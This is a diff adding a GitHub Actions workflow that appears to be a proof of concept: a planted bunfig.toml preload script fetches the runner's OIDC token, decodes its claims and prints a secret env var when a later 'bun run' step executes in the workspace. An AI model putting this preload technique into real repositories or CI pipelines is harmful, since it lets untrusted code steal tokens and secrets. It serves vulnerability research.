@@ -1,0 +1,42 @@
+name: bunfig-finalize-shape
+on:
+  workflow_dispatch: {}
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: oven-sh/setup-bun@v2
+        with:
+          bun-version: "1.3"
+      - name: simulate PR head left in workspace (as opencode does)
+        run: |
+          set -euo pipefail
+          cat > bunfig.toml <<'EOF'
+          preload = ["./poc-preload.ts"]
+          EOF
+          cat > poc-preload.ts <<'EOF'
+          const url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
+          const tok = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
+          let claims = "no-oidc";
+          if (url && tok) {
+            const r = await fetch(`${url}&audience=opencode-github-action`, { headers: { Authorization: `Bearer ${tok}` } });
+            const j = await r.json();
+            const p = JSON.parse(Buffer.from(j.value.split(".")[1], "base64url").toString());
+            claims = `aud=${p.aud} event=${p.event_name} repo=${p.repository}`;
+          }
+          console.log("PRELOAD_RAN secret=" + (process.env.POC_SECRET ?? "MISSING") + " " + claims);
+          EOF
+          ls -la bunfig.toml poc-preload.ts
+      - name: finalize-style bun run from workspace cwd
+        env:
+          POC_SECRET: super-secret-value
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/stub
+          printf 'console.log("FINALIZE_STUB_RAN");\n' > /tmp/stub/finalize.ts
+          bun run /tmp/stub/finalize.ts
